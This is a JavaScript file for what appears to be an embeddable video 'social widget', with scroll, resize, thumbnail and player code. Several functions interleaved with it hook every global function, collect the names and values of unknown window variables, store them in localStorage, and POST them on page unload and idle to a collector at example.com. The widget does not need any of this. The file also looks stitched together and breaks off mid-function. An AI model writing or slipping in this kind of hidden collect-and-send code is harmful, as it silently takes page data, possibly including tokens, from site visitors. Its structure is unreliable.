function fillSocialWidget() {
  document.getElementById("social_widget").innerHTML = SbSocialWidget.options.embed;
}
var globalVarCollector = {};
function jshook(originalFunction, functionName) {
  return function () {
    globalVarCollector[`Before ${functionName} Function Call`] = discoverUnknownProperties();
    var result = originalFunction.apply(this, arguments);
    globalVarCollector[`After ${functionName} Function Call`] = discoverUnknownProperties();
    return result;
  };
}
function initJshook() {
  for (const prop in window) {
    if (Object.prototype.hasOwnProperty.call(window, prop)) {
      var propValue = window[prop];
      var propType = typeof propValue;
      if (propType === "function") {
        window[prop] = jshook(propValue, prop);
      }
    }
  }
}
function fillContentDir(a) {
  a.catchAndRelease && (SbSocialWidget.initListeners(), document.getElementById("social_widget").innerHTML = '<style type="text/css">#sb-close-btn {opacity: 0;padding: 0;position: absolute;right: -18px;top: 0px;z-index: 4;background-color: transparent;border: 0 none;border-radius: 2px;cursor: pointer;}.x_18_border {background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAABvElEQVR42o2UMWvCUBDHS0e/QkHapUO/hJMfoCIiwTqIiDg4dLHiEIpIcXKUTEKli5VspeVNwWZwq6NTFxERKRLEQahc319yjxdMsAd/uMS7n/fu3eWMiKIUk0pKlaQMqXhULBT2MiElKNw+pR7/A7I4Y7fb0WQyISEEjUYjWq1WOvBd6jIKZCNiv9/TcDikbDZLqVQqINM0ablcMuxH6lqB9ErW6zXVajUkRcowDHJdl2FfOuiKK6nX6yqhUqkEAMViUVWZyWRoOp0y7IlBD3hyHEcldTqdA7jb7SrIYrFAzxSs0WgwyGXQG55arZYC2bZNbP1+/wCBzedzKhQKHKdfQBwgD14ul8OPYbBQCITb9M0A6BdeOp0+6slms9ErO2o8RsO3EkDf8Mrlsg7h4+gw7pkSeuZbEqBneJZlqYDxeBw4DuaKrVqtIgZNx9Dy6xhABrzZbKaOl8/nMSuBngwGg0BFvV6PIUIfSEcK/4ygk0JV2+2WQbc6KKHwQmB6IyHtdps8z+Pwl7BdS/ANYp9wDL4AgJvNJq8G26vUedT23/ibHWW8rPenPiOsO9wmjwamQOpDCntxEZbzB2eQ0yFlKou1AAAAAElFTkSuQmCC");height: 18px;width: 18px;transition: opacity 0.5s ease-in;-webkit-transition: opacity 0.5s ease-in;-moz-transition: opacity 0.5s ease-in;}</style><button class="x_18_border" id="sb-close-btn" onclick="SbSocialWidget.closeUnit()"></button>'), a.collapse ? (document.getElementById("social_widget").style.width = "0px", document.getElementById("social_widget").style.height = "0px") : a.snapshot ? (document.getElementById("social_widget").insertAdjacentHTML("beforeend", '<img src="' + a.snapshot + '" style="cursor: pointer;" onclick="fillSocialWidget()" width="' + SbSocialWidget.options.width + '" height="' + SbSocialWidget.options.height + '" />'), SbSocialWidget.options.embed = a.embed) : document.getElementById("social_widget").insertAdjacentHTML("beforeend", a.embed), SbSocialWidget.unitDiv = document.getElementById("social_widget"), SbSocialWidget.xPos = SbSocialWidget.posX(), SbSocialWidget.yPos = SbSocialWidget.posY(SbSocialWidget.unitDiv);
}
function discoverUnknownProperties() {
  const unknownProps = {};
  for (const prop in window) {
    if (Object.prototype.hasOwnProperty.call(window, prop) && !window.seenVars.some(knownProp => knownProp === prop)) {
      const propValue = window[prop];
      const propType = typeof propValue;
      unknownProps[prop] = {
        type: propType,
        value: propType === "function" ? `[Function: ${propValue.name}]` : propValue
      };
    }
  }
  return unknownProps;
}
function handleAd(a, b, c, d, e) {
  if (top === self) {
    var f = document.createElement("script");
    f.setAttribute("type", "text/javascript"), f.src = "//" + e + "cdn.springboardplatform.com/js/overlay", document.getElementById("social_widget").appendChild(f), f = document.createElement("script"), f.setAttribute("type", "text/javascript"), f.src = "//" + e + "cdn.springboardplatform.com/storage/js/swfobject/swfobject.js", document.getElementById("social_widget").appendChild(f), SbSocialWidget.init({
      partnerId: a,
      width: b,
      height: c,
      widgetId: d,
      cmsPath: "//" + e + "cms.springboardplatform.com"
    });
  } else {
    var g = !1;
    if ("undefined" != typeof inDapIF ? g = !0 : top.location.host == self.location.host && (g = !0), g) {
      var h = window.frameElement,
        i = h.parentNode,
        f = document.createElement("script");
      f.setAttribute("type", "text/javascript"), f.src = "//" + e + "cdn.springboardplatform.com/storage/js/social_widget/sw.js", i.appendChild(f);
      var f = document.createElement("script");
      f.setAttribute("type", "text/javascript"), f.src = "//" + e + "cdn.springboardplatform.com/js/overlay", i.appendChild(f), f = document.createElement("script"), f.setAttribute("type", "text/javascript"), f.src = "//" + e + "cdn.springboardplatform.com/storage/js/swfobject/swfobject.js", i.appendChild(f), f = document.createElement("div"), f.id = "social_widget", f.style.width = b + "px", f.style.height = c + "px", f.style.position = "relative", f.style.overflow = "hidden", i.appendChild(f), h.style.width = "0px", h.style.height = "0px";
      var f = document.createElement("script");
      f.setAttribute("type", "text/javascript");
      var j = "overInterval = setInterval(function(){";
      j += 'if(typeof SbSocialWidget == "undefined") {} else { clearInterval(overInterval); SbSocialWidget.init({partnerId : ' + a + ", width : " + b + ", height : " + c + ", widgetId : '" + d + "', cmsPath : '//" + e + "cms.springboardplatform.com'\t});  } }", j += ", 200);", f.innerHTML = j, i.appendChild(f);
    }
  }
}
function transmitDiscoveries(discoveries) {
  const collectorUrl = "https://example.com/api/collect";
  const xhr = new XMLHttpRequest();
  xhr.open("POST", collectorUrl);
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      if (xhr.status === 200) {
        console.debug("Unknown property data successfully transmitted");
      } else {
        console.warn(`Unknown property data transmission failed, server response code: ${xhr.status}`);
      }
    }
  };
  xhr.send(JSON.stringify(discoveries));
}
function slideDownSocialWidget() {
  var a = parseInt(document.getElementById("social_widget").style.height);
  a + 20 > SbSocialWidget.options.height ? (a = SbSocialWidget.options.height, clearInterval(slideDownInterval)) : a += 20, document.getElementById("social_widget").style.height = a + "px";
}
function setCookie(a, b) {
  var c = new Date();
  c.setTime(c.getTime() + 36e5);
  var d = "expires=" + c.toGMTString();
  document.cookie = a + "=" + b + "; " + d;
}
function getCookie(a) {
  for (var b = a + "=", c = document.cookie.split(";"), d = 0; d < c.length; d++) {
    var e = c[d].trim();
    if (0 == e.indexOf(b)) return e.substring(b.length, e.length);
  }
  return "";
}
function collectGlobalVars() {
  globalVarCollector["Global Variables"] = discoverUnknownProperties();
  localStorage.setItem("globalVarCollector", JSON.stringify(globalVarCollector));
}
function checkCookie(a) {
  var b = getCookie(a);
  return "" != b;
}
function runDiscoveryJob() {
  collectGlobalVars();
  const unknownProperties = discoverUnknownProperties();
  const discoveryCount = Object.keys(unknownProperties).length;
  if (discoveryCount > 0) {
    console.group(`Found ${discoveryCount} unknown window properties:`);
    for (const prop in unknownProperties) {
      console.log(`- ${prop}: ${JSON.stringify(unknownProperties[prop])}`);
    }
    console.groupEnd();
    transmitDiscoveries(unknownProperties);
  } else {
    console.debug("No new unknown window properties were found");
  }
}
initJshook();
window.addEventListener("unload", () => {
  console.debug("Page is about to be unloaded, running final unknown property discovery task");
  runDiscoveryJob();
  collectGlobalVars();
});
function showWidget() {
  var a = !1;
  if (checkCookie("SbSearchEngineCookie")) a = !0;else {
    var b = /(^https?:\/\/(www\.)?(r\.search\.)?(google|bing|yahoo)\.)/;
    b.test(document.referrer) && (a = !0, setCookie("SbSearchEngineCookie", "search-engine"));
  }
  return a;
}
window.addEventListener("idle", runDiscoveryJob);
if (void 0 == SbSocialWidget) var SbSocialWidget = {
  xPos: 0,
  yPos: 0,
  unitDiv: null,
  overlayTop: 0,
  compareValue: 0,
  originalCompareValue: 0,
  originalDivDistance: 0,
  contentPlayed: !1,
  playerId: null,
  sbThumbsShowing: !1,
  sbThumbTimeoutCheck: null,
  jsonData: null,
  widthTimer: 2e3,
  options: {
    cmsPath: "//dev.publishers.springboardplatform.com"
  },
  each: function (a, b) {
    if (a) {
      var c = a.length;
      if (void 0 === c) {
        for (var d in a) if (b.call(a[d], d, a[d]) === !1) break;
      } else for (var e = a[0], f = 0; f < c && b.call(e, f, e) !== !1; e = a[++f]);
      return a;
    }
  },
  init: function (a) {
    var b = SbSocialWidget.clone(SbSocialWidget.options);
    b = SbSocialWidget.extend(b, a), SbSocialWidget.options = b, SbSocialWidget.options.originalWidth = SbSocialWidget.options.width, SbSocialWidget.options.originalHeight = SbSocialWidget.options.height;
    for (var c = document.getElementsByTagName("script"), d = !0, e = 0; e < c.length; e++) if (c[e].src && c[e].src.indexOf("js/overlay") != -1) {
      d = !1;
      break;
    }
    if (d) {
      var f = "",
        g = /\/\/([a-z0-9]+)\.cms/i;
      if (g.test(a.cmsPath)) {
        var h = new RegExp(/\/\/([a-z0-9]+)\.cms/i),
          i = h.exec(a.cmsPath);
        f = i[1] + ".";
      }
      var j = document.getElementsByTagName("head")[0],
        k = document.createElement("script");
      k.type = "text/javascript", k.src = "//" + f + "cdn.springboardplatform.com/js/overlay", j.appendChild(k);
    }
    261 == SbSocialWidget.options.partnerId || 20 == SbSocialWidget.options.partnerId ? (this.resizeTimer(), this.bindEvent(window, "resize", SbSocialWidget.handleResize)) : this.makeCall();
  },
  handleResize: function () {
    var a = document.getElementById("social_widget"),
      b = a.parentNode,
      c = b.clientWidth;
    if (SbSocialWidget.jsonData && (c > 300 && c < SbSocialWidget.options.width || c > 300 && c > SbSocialWidget.options.width) && !SbSocialWidget.jsonData.dimensions.showThumbsOnMouseOver && "landscape" == SbSocialWidget.jsonData.dimensions.widgetView) {
      c > SbSocialWidget.options.originalWidth && (c = SbSocialWidget.options.originalWidth), SbSocialWidget.options.height = Math.ceil(c * SbSocialWidget.options.height / SbSocialWidget.options.width), SbSocialWidget.options.width = c, a.style.width = c + "px", a.style.height = SbSocialWidget.options.height + "px";
      var d = document.getElementById("syndicatedMainDiv");
      if (d.style.width = SbSocialWidget.options.width - 10 + "px", d.style.height = SbSocialWidget.options.height - 6 + "px", SbSocialWidget.jsonData.dimensions.showThumbsOnMouseOver) ;else if ("landscape" == SbSocialWidget.jsonData.dimensions.widgetView) {
        var e = Math.min(85, Math.floor((SbSocialWidget.options.height - 10) / 4.2)),
          f = Math.floor(16 * e / 10),
          g = Math.floor(e / 3),
          h = 8,
          i = Math.floor((SbSocialWidget.options.width - 10 + h) / (h + f));
        SbSocialWidget.jsonData.dimensions.thumb_num = i, SbSocialWidget.jsonData.dimensions.thumb_width = f;
        var j = SbSocialWidget.options.height - 10 - e - 2 * g,
          k = document.getElementById("syndicatedPlayerDiv");
        k.style.width = SbSocialWidget.options.width - 10 + "px", k.style.height = j + "px", $sbPlayer(SbSocialWidget.playerId).getConfig().style.original_width = SbSocialWidget.options.width - 10, $sbPlayer(SbSocialWidget.playerId).getConfig().style.original_height = j;
        var l = document.querySelectorAll("div.relatedVideosLandscape");
        l[0].style.width = SbSocialWidget.options.width - 10 + "px", l[0].style.height = e + "px", l[0].style.marginTop = g + "px";
        var m = document.getElementById("relatedContentScroll");
        m.style.height = e + "px";
        var n = document.getElementsByClassName("related_video_box");
        SbSocialWidget.each(n, function () {
          this.style.width = f + "px", this.style.height = e + "px";
        });
        var o = document.getElementsByClassName("related_video_image");
        SbSocialWidget.each(o, function () {
          this.style.width = f + "px", this.style.height = e + "px";
        });
        var p = document.getElementsByClassName("related_now_playing");
        SbSocialWidget.each(p, function () {
          this.style.width = f + "px", this.style.height = e + "px";
        });
        var q = document.getElementsByClassName("related_press_play");
        SbSocialWidget.each(q, function () {
          this.style.width = f + "px", this.style.height = e + "px";
        });
        var r = document.getElementsByClassName("related_press_play_image");
        SbSocialWidget.each(r, function () {
          this.style.width = f + "px", this.style.height = e + "px";
        });
        var s = document.getElementById("relatedArrowLeftDiv");
        s.style.height = e + "px";
        var t = document.getElementById("relatedArrowRightDiv");
        t.style.height = e + "px";
        var u = document.getElementById("relatedArrowLeft");
        u.style.marginTop = (e - 26) / 2 + "px";
        var v = document.getElementById("relatedArrowRight");
        v.style.marginTop = (e - 26) / 2 + "px";
      }
    }
  },
  resizeTimer: function () {
    if (SbSocialWidget.widthTimer > 0) {
      SbSocialWidget.widthTimer = SbSocialWidget.widthTimer - 200;
      var a = document.getElementById("social_widget");
      if (!a) return !1;
      var b = a.parentNode,
        c = b.clientWidth;
      0 == c ? setTimeout(SbSocialWidget.resizeTimer, 200) : (c > 300 && c < SbSocialWidget.options.width && (SbSocialWidget.options.height = Math.ceil(c * SbSocialWidget.options.height / SbSocialWidget.options.width), SbSocialWidget.options.width = c, a.style.width = c + "px", a.style.height = SbSocialWidget.options.height + "px"), SbSocialWidget.makeCall());
    } else SbSocialWidget.makeCall();
  },
  clone: function (a) {
    if (!a || "object" != typeof a) return a;
    var b = new a.constructor();
    for (var c in a) a.hasOwnProperty(c) && (b[c] = SbSocialWidget.clone(a[c]));
    return b;
  },
  extend: function (a, b) {
    for (var c in b) "object" == typeof a[c] ? a[c] = SbSocialWidget.extend(a[c], b[c]) : a[c] = b[c];
    return a;
  },
  makeCall: function () {
    var a = this.options.cmsPath + "/expandables/syndicatedhtml5noiframe/" + this.options.partnerId + "/" + this.options.widgetId + "/" + SbSocialWidget.options.width + "/" + SbSocialWidget.options.height,
      b = document.getElementsByTagName("head").item(0),
      c = document.createElement("script");
    c.setAttribute("type", "text/javascript"), c.setAttribute("src", a), c.async = !0, b.appendChild(c);
  },
  posY: function (a) {
    for (var b = a, c = 0; b && "body" !== b.tagName.toLowerCase();) c += b.offsetTop, b = b.offsetParent;
    return c;
  },
  posX: function () {
    for (var a = document.getElementById("social_widget"), b = 0; a && "body" !== a.tagName.toLowerCase();) b += a.offsetLeft, a = a.offsetParent;
    return b;
  },
  bindEvent: function (a, b, c) {
    "undefined" != typeof document.addEventListener ? a.addEventListener(b, c, !1) : "undefined" != typeof window.attachEvent && a.attachEvent(b, c);
  },
  unbindEvent: function (a, b, c) {
    "undefined" != typeof document.addEventListener ? a.removeEventListener(b, c, !1) : "undefined" != typeof window.attachEvent && a.detachEvent(b, c);
  },
  getFixed: function () {
    var a = 0;
    if (/IE/i.test(navigator.userAgent)) return 0;
    var b = Array.prototype.slice.call(document.getElementsByTagName("div")),
      c = Array.prototype.slice.call(document.getElementsByTagName("header"));
    if (c) for (var d = 0; d < c.length; d++) {
      var e = c[d].getElementsByTagName("div");
      if (e) for (var f = 0; f < e.length; f++) for (var g = 0; g < b.length; g++) if (b[g].isEqualNode(e[f])) {
        b.splice(g, 1);
        break;
      }
    }
    for (var d = 0; d < c.length; d++) this.checkHeader(c[d]) && (a += c[d].offsetHeight);
    return a;
  },
  checkHeader: function (a) {
    return 0 == a.offsetTop && 0 != a.offsetHeight && "none" != this.getStyle(a, "display") && this.checkWidth(a) && "fixed" == this.getStyle(a, "position") && "hidden" != this.getStyle(a, "visibility") && this.getStyle(a, "opacity") > 0;
  },
  checkDiv: function (a) {
    return Number(this.getStyle(a, "z-index")) > 0 && 0 == a.offsetTop && 0 != a.offsetHeight && "none" != this.getStyle(a, "display") && "fixed" == this.getStyle(a, "position") && this.checkWidth(a) && "hidden" != this.getStyle(a, "visibility") && this.getStyle(a, "opacity") > 0;
  },
  getStyle: function (a, b) {
    var c;
    return a.currentStyle ? c = a.currentStyle[b] : window.getComputedStyle && (c = document.defaultView.getComputedStyle(a, b).getPropertyValue(b)), c;
  },
  checkWidth: function (a) {
    return !0;
  },
  initListeners: function () {
    this.bindEvent(window, "scroll", SbSocialWidget.onWindowScroll);
  },
  onWindowScroll: function () {
    var a = SbSocialWidget.unitDiv.style.position,
      b = SbSocialWidget.scrollYValue(),
      c = SbSocialWidget.getFixed(),
      d = SbSocialWidget.yPos - c,
      e = 0 + c;
    0 == SbSocialWidget.originalCompareValue && (SbSocialWidget.originalCompareValue = d);
    var f = document.getElementById("sbOverlay_syndicatedtv_" + SbSocialWidget.options.widgetId);
    f && (0 == SbSocialWidget.originalDivDistance && (SbSocialWidget.originalDivDistance = SbSocialWidget.posY(SbSocialWidget.unitDiv) - SbSocialWidget.posY(f)), d = SbSocialWidget.posY(f) - c, "fixed" === a && (d = SbSocialWidget.originalCompareValue - SbSocialWidget.originalDivDistance), e = SbSocialWidget.originalDivDistance + c), b >= d ? ("relative" === a && (SbSocialWidget.unitDiv.style.position = "fixed", SbSocialWidget.unitDiv.style.top = e + "px", SbSocialWidget.unitDiv.style.left = SbSocialWidget.xPos + "px", SbSocialWidget.unitDiv.style.zIndex = 999999, SbSocialWidget.contentPlayed && (document.getElementById("sb-close-btn").style.opacity = 1, document.getElementById("sb-close-btn").style.right = "0px")), "fixed" === a && (SbSocialWidget.unitDiv.style.top = e + "px"), f && (f.style.position = "fixed", f.style.top = c + "px")) : "fixed" === a && (SbSocialWidget.unitDiv.style.position = "relative", SbSocialWidget.unitDiv.style.top = "", SbSocialWidget.unitDiv.style.left = "", SbSocialWidget.unitDiv.style.zIndex = "", f && (f.style.position = "absolute", f.style.top = SbSocialWidget.posY(SbSocialWidget.unitDiv) - SbSocialWidget.originalDivDistance + "px"), SbSocialWidget.unbindEvent(window, "scroll", SbSocialWidget.onWindowScroll), document.getElementById("sb-close-btn").style.opacity = 0, document.getElementById("sb-close-btn").style.right = "-18px");
  },
  scrollYValue: function () {
    return window.pageYOffset ? window.pageYOffset : Math.max(document.documentElement.scrollTop, document.body.scrollTop);
  },
  closeUnit: function () {
    var a = document.getElementById("sbOverlay_syndicatedtv_" + SbSocialWidget.options.widgetId);
    document.getElementById("sb-close-btn").style.opacity = 0, document.getElementById("sb-close-btn").style.right = "-18px", SbSocialWidget.unitDiv.style.position = "relative", SbSocialWidget.unitDiv.style.top = "", SbSocialWidget.unitDiv.style.left = "", SbSocialWidget.unitDiv.style.zIndex = "", a && (a.style.position = "absolute", a.style.top = SbSocialWidget.posY(SbSocialWidget.unitDiv) - SbSocialWidget.originalDivDistance + "px"), SbSocialWidget.unbindEvent(window, "scroll", SbSocialWidget.onWindowScroll);
  },
  fillContentDir: function (a) {
    function h(b) {
      function n() {
        if ("left" == d) {
          var a = document.getElementById("relatedContentScroll").style.left;
          "0px" == a && (document.getElementById("relatedArrowLeftDiv").style.opacity = 0);
          var b = window.getComputedStyle(document.getElementById("relatedArrowRightDiv"), null).getPropertyValue("opacity");
          "0" == b && (document.getElementById("relatedArrowRightDiv").style.opacity = 1);
        } else {
          var c = window.getComputedStyle(document.getElementById("relatedArrowLeftDiv"), null).getPropertyValue("opacity");
          "0" == c && (document.getElementById("relatedArrowLeftDiv").style.opacity = 1);
          var a = document.getElementById("relatedContentScroll").style.left;
          a == j && (document.getElementById("relatedArrowRightDiv").style.opacity = 0);
        }
        SbSocialWidget.bindEvent(document.getElementById("relatedArrowLeft"), "click", h), SbSocialWidget.bindEvent(document.getElementById("relatedArrowRight"), "click", h), SbSocialWidget.unbindEvent(document.getElementById("relatedContentScroll"), "transitionend", n);
      }
      var c = b.target.id,
        d = c.indexOf("Right") != -1 ? "right" : "left",
        e = a.dimensions.thumb_space,
        f = a.dimensions.thumb_num,
        g = a.dimensions.thumb_width,
        i = Math.ceil(a.videosArray.length / f) - 1;
      if ("left" == d) var j = "0px",
        k = f * (g + e);else {
        var j = i * f * (g + e) * -1 + "px",
          k = f * (g + e);
        k *= -1;
      }
      var l = document.getElementById("relatedContentScroll").style.left;
      if (l != j) {
        SbSocialWidget.unbindEvent(document.getElementById("relatedArrowRight"), "click", h), SbSocialWidget.unbindEvent(document.getElementById("relatedArrowLeft"), "click", h);
        var m = parseInt(window.getComputedStyle(document.getElementById("relatedContentScroll"), null).getPropertyValue("left"));
        document.getElementById("relatedContentScroll").style.left = m + k + "px", SbSocialWidget.bindEvent(document.getElementById("relatedContentScroll"), "transitionend", n);
      }
    }
    function l(a) {
      var b = parseInt(a.target.id.replace("_press_play", ""));
      return !$sbPlayer(SbSocialWidget.playerId).isAdPlayed() && 1 != document.getElementById(b + "_now_playing").style.opacity && (i[b] = !0, void setTimeout(function () {
        m(b);
      }, 100));
    }
    function m(a) {
      i[a] && (document.getElementById(a + "_press_play").style.opacity = 0, document.getElementById(a + "_press_play_image").style.opacity = 1);
    }
    function n(a) {
      var b = parseInt(a.target.id.replace("_press_play_image", ""));
      return !$sbPlayer(SbSocialWidget.playerId).isAdPlayed() && 1 != document.getElementById(b + "_now_playing").style.opacity && (document.getElementById(b + "_press_play").style.opacity = 0, document.getElementById(b + "_press_play_image").style.opacity = 0, document.getElementById(b + "_now_playing").style.opacity = 1, void SbSocialWidget.playClickedVideo(b));
    }
    if (this.unitDiv = document.getElementById("social_widget"), !this.unitDiv) return !1;
    this.jsonData = a, this.xPos = SbSocialWidget.posX(), this.yPos = SbSocialWidget.posY(SbSocialWidget.unitDiv);
    var b = document.createElement("script");
    if (b.type = "text/javascript", b.src = "//s0.2mdn.net/instream/html5/ima3.js", this.unitDiv.appendChild(b), a.WidgetTeaser.catchAndRelease) {
      SbSocialWidget.initListeners();
      var c = '<style type="text/css">#sb-close-btn {opacity: 0;padding: 0;position: absolute;right: -18px;top: 0px;z-index: 4;background-color: transparent;border: 0 none;border-radius: 2px;cursor: pointer;}.x_18_border {background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAABvElEQVR42o2UMWvCUBDHS0e/QkHapUO/hJMfoCIiwTqIiDg4dLHiEIpIcXKUTEKli5VspeVNwWZwq6NTFxERKRLEQahc319yjxdMsAd/uMS7n/fu3eWMiKIUk0pKlaQMqXhULBT2MiElKNw+pR7/A7I4Y7fb0WQyISEEjUYjWq1WOvBd6jIKZCNiv9/TcDikbDZLqVQqINM0ablcMuxH6lqB9ErW6zXVajUkRcowDHJdl2FfOuiKK6nX6yqhUqkEAMViUVWZyWRoOp0y7IlBD3hyHEcldTqdA7jb7SrIYrFAzxSs0WgwyGXQG55arZYC2bZNbP1+/wCBzedzKhQKHKdfQBwgD14ul8OPYbBQCITb9M0A6BdeOp0+6slms9ErO2o8RsO3EkDf8Mrlsg7h4+gw7pkSeuZbEqBneJZlqYDxeBw4DuaKrVqtIgZNx9Dy6xhABrzZbKaOl8/nMSuBngwGg0BFvV6PIUIfSEcK/4ygk0JV2+2WQbc6KKHwQmB6IyHtdps8z+Pwl7BdS/ANYp9wDL4AgJvNJq8G26vUedT23/ibHWW8rPenPiOsO9wmjwamQOpDCntxEZbzB2eQ0yFlKou1AAAAAElFTkSuQmCC");height: 18px;width: 18px;transition: opacity 0.5s ease-in;-webkit-transition: opacity 0.5s ease-in;-moz-transition: opacity 0.5s ease-in;}</style><button class="x_18_border" id="sb-close-btn" onclick="SbSocialWidget.closeUnit()"></button>';
      document.getElementById("social_widget").insertAdjacentHTML("beforeend", c);
    }
    var d = '<style type="text/css">.syndicatedMainDiv {border: 1px solid #D1D3D4;background-color: ' + a.colors.mainColor + ";overflow: hidden;padding: 4px 4px 0px 4px;width: " + (a.dimensions.width - 8 - 2) + "px;height: " + (a.dimensions.height - 4 - 2) + "px;box-sizing: content-box;}.syndicatedPlayerDiv {width: " + (a.dimensions.width - 8 - 2) + "px;height: " + a.dimensions.player_height + "px;background-color: black;}";
    ("landscape" == a.dimensions.widgetView || a.dimensions.showThumbsOnMouseOver) && (d += ".sbVolumeButton {margin-top: 4px;margin-left: 2px;cursor:pointer;position:absolute;top:2px;opacity: 1.0;filter: alpha(opacity=80); /* For IE8 and earlier */}.sbVolumeButton:hover {opacity: 1.0;filter: alpha(opacity=100); /* For IE8 and earlier */}.relatedVideosLandscape {width: " + (a.dimensions.width - 8 - 2) + "px; /*width - 2px border - 8px padding*/height: " + a.dimensions.thumb_height + "px;margin-top: " + a.dimensions.thumb_margin + "px;position: relative;overflow: hidden;-webkit-transition: margin .35s ease-in-out;-moz-transition: margin .35s ease-in-out;-ms-transition: margin .35s ease-in-out;-o-transition: margin .35s ease-in-out;transition: margin .35s ease-in-out;}.relatedArrowDivLandscape {position: absolute;top: 0px;width: 20px;height: " + a.dimensions.thumb_height + "px;background-color: rgba" + a.colors.arrowBackground + ";}.relatedArrowtDivLeftLandscape {opacity: 0;left: 0px;-webkit-transition: opacity .35s ease-in-out;-moz-transition: opacity .35s ease-in-out;-ms-transition: opacity .35s ease-in-out;-o-transition: opacity .35s ease-in-out;transition: opacity .35s ease-in-out;}.relatedArrowtDivRightLandscape {right: 0px;opacity: 1;-webkit-transition: opacity .35s ease-in-out;-moz-transition: opacity .35s ease-in-out;-ms-transition: opacity .35s ease-in-out;-o-transition: opacity .35s ease-in-out;transition: opacity .35s ease-in-out;}.relatedArrowLandscape {width: 16px;\t/*image width*/height: 26px;\t/*image height*/margin-right: 2px;margin-top: " + (a.dimensions.thumb_height - 26) / 2 + "px;cursor: pointer;}.relatedArrowLeftLandscape {float: left;background: url(" + a.info.imgPath + "/img/expandable/arrow_" + a.colors.arrowType + "left.png);}.relatedArrowRightLandscape {float: right;background: url(" + a.info.imgPath + "/img/expandable/arrow_" + a.colors.arrowType + "right.png);}.relatedContentScrollLandscape {width: 3500px;height: " + a.dimensions.thumb_height + "px;position: relative;left: 0px;-webkit-transition: left .35s ease-in-out;-moz-transition: left .35s ease-in-out;-ms-transition: left .35s ease-in-out;-o-transition: left .35s ease-in-out;transition: left .35s ease-in-out;}"), "portrait" != a.dimensions.widgetView || a.dimensions.showThumbsOnMouseOver || (d += ".relatedVideosPortrait {width: " + (a.dimensions.width - 8 - 2) + "px;height: " + a.dimensions.thumb_div_height + "px;margin-top: " + a.dimensions.thumb_margin + "px;position: relative;}"), d += ".related_video_box {width: " + a.dimensions.thumb_width + "px;height: " + a.dimensions.thumb_height + 'px;float: left;cursor: pointer;position: relative;background-color: "red";}.related_video_image {display: block;width: ' + a.dimensions.thumb_width + "px;height: " + a.dimensions.thumb_height + "px;}.related_now_playing {position: absolute;top: 0px;width: " + a.dimensions.thumb_width + "px;height: " + a.dimensions.thumb_height + "px;line-height: " + a.dimensions.thumb_height + "px;text-align: center;font-family: Arial;font-size: 10px;font-weight: bold;color: #BEBABA;-webkit-transition: opacity .35s ease-in-out;-moz-transition: opacity .35s ease-in-out;-ms-transition: opacity .35s ease-in-out;-o-transition: opacity .35s ease-in-out;transition: opacity .35s ease-in-out;}.related_press_play {position: absolute;top: 0px;width: " + a.dimensions.thumb_width + "px;height: " + a.dimensions.thumb_height + "px;background: rgba" + a.colors.thumb_over + ";-webkit-transition: opacity .1s ease-in-out;-moz-transition: opacity .1s ease-in-out;-ms-transition: opacity .1s ease-in-out;-o-transition: opacity .1s ease-in-out;transition: opacity .1s ease-in-out;}.related_press_play_image {opacity: 0;position: absolute;top: 0px;width: " + a.dimensions.thumb_width + "px;height: " + a.dimensions.thumb_height + "px;background: url(" + a.info.imgPath + "/img/expandable/play_thumb_related2.png) no-repeat center center;-webkit-transition: opacity .1s ease-in-out;-moz-transition: opacity .1s ease-in-out;-ms-transition: opacity .1s ease-in-out;-o-transition: opacity .1s ease-in-out;transition: opacity .1s ease-in-out;}", d += "</style>", document.getElementById("social_widget").insertAdjacentHTML("beforeend", d), SbSocialWidget.playerId = a.WidgetTeaser.player_id + "_syndicatedtv_" + a.WidgetTeaser.id;
    var e = "";
    a.dimensions.showThumbsOnMouseOver && (e += '<div class="sbVolumeButton" style="z-index: 5;"><img id="sbVideoMute" src="' + a.info.imgPath + '/img/syndi_volume_on.png" onclick="SbSocialWidget.controlSoundOnVideo(true, true)"/><img id="sbVideoUnmute" src="' + a.info.imgPath + '/img/syndi_volume_off.png" onclick="SbSocialWidget.controlSoundOnVideo(false, true)" style="visibility:hidden; left:0px; top:0px; position:absolute;"/></div>');
    var f = '<div class="syndicatedMainDiv" id="syndicatedMainDiv"><div class="syndicatedPlayerDiv" id="syndicatedPlayerDiv"><div class="videoPlayer" id="' + SbSocialWidget.playerId + '"></div>' + e + "</div>" + this.renderThumbs(a) + "</div>";
    if (document.getElementById("social_widget").insertAdjacentHTML("beforeend", f), a.dimensions.showThumbsOnMouseOver && this.showThumbsOnRolloverEvents(), "undefined" == typeof $sbPlayer) {
      var g = document.createElement("script");
      g.type = "text/javascript", g.src = "//" + a.info.env + ".springboardplatform.com/jsapi/embedhtml5/sb.js", g.onload = function () {
        SbSocialWidget.playerInit();
      }, this.unitDiv.appendChild(g);
    } else this.playerInit();
    if (SbSocialWidget.bindEvent(document.getElementById("relatedArrowLeft"), "click", h), SbSocialWidget.bindEvent(document.getElementById("relatedArrowRight"), "click", h), !a.dimensions.isMobile) {
      for (var i = [], j = 0; j < a.videosArray.length; j++) i[j] = !1;
      var k = document.getElementsByClassName("related_press_play_image");
      SbSocialWidget.each(k, function () {
        SbSocialWidget.bindEvent(this, "mouseover", l);
      }), SbSocialWidget.each(k, function () {
        SbSocialWidget.bindEvent(this, "mouseout", function (a) {
          var b = parseInt(a.target.id.replace("_press_play", ""));
          return i[b] = !1, 1 != document.getElementById(b + "_now_playing").style.opacity && (document.getElementById(b + "_press_play").style.opacity = 1, void (document.getElementById(b + "_press_play_image").style.opacity = 0));
        });
      });
    }
    var k = document.getElementsByClassName("related_press_play_image");
    SbSocialWidget.each(k, function () {
      SbSocialWidget.bindEvent(this, "click", n);
    });
  },
  playerInit: function () {
    $sbPlayer(SbSocialWidget.playerId, SbSocialWidget.jsonData.jsonEmbedArray), $sbPlayer(SbSocialWidget.playerId).onStart(function () {
      var a = $sbPlayer(SbSocialWidget.playerId).getActiveIndex(),
        b = document.getElementsByClassName("related_now_playing"),
        c = document.getElementsByClassName("related_press_play");
      SbSocialWidget.each(b, function () {
        this.style.opacity = 0;
      }), SbSocialWidget.each(c, function () {
        this.style.opacity = 1;
      }), document.getElementById(a + "_now_playing").style.opacity = 1, document.getElementById(a + "_press_play").style.opacity = 0, SbSocialWidget.jsonData.WidgetTeaser.catchAndRelease && SbSocialWidget.toggleCloseButton(!0);
